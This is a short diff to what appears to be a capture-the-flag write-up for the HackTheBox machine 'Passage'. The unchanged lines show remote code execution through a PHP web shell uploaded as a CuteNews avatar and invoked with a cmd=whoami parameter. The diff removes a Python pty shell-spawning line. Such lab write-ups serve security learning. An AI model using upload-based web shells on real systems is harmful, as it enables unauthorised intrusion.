@@ -49,10 +49,6 @@ after uploading php file
 we can visit it at http://passage.htb/CuteNews/uploads/avatar_ozzo_cmd.php?cmd=whoami
 
 and we got rce!
-
-and then
-
-python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 ## Users in machine(/home)
